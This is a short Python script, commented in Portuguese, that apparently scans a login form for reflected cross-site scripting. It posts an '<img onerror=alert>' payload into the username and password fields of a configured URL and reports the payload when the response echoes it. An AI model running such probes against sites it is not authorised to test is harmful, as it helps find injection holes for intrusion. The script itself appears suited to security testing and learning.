from parametros import FORMULARIO, URL
import requests # Importação da biblioteca para fazermos requisição 

def payloads(): # Função principal para armazena os payloads
    return ( # aqui você deve adicionar mais payload
    '<img src=x onerror="alert(\'XssStrick\');">',
    )
    
def start():
    listar_pay = payloads()
    for pay in listar_pay:
        requisicao(pay)
        
def requisicao(payload): # Função para efetuar a requisição passando os parâmetros 
    DADOS_ENVIO = FORMULARIO.copy()
    DADOS_ENVIO['usuario'] = payload # <-- devem ser os mesmo parâmetros do arquivo parametros.py
    DADOS_ENVIO['senha'] = payload # <-- devem ser os mesmo parâmetros do arquivo parametros.py
    
    try:
        RESPOSTA = requests.post(URL, data=DADOS_ENVIO, timeout=5)
        if payload in RESPOSTA.text:
            print(f"encontrado ---> {payload}")
    except requests.exceptions.RequestException as e:
        print(f" Erro ---> {URL}: {e}")
if __name__ == "__main__":
    start()
    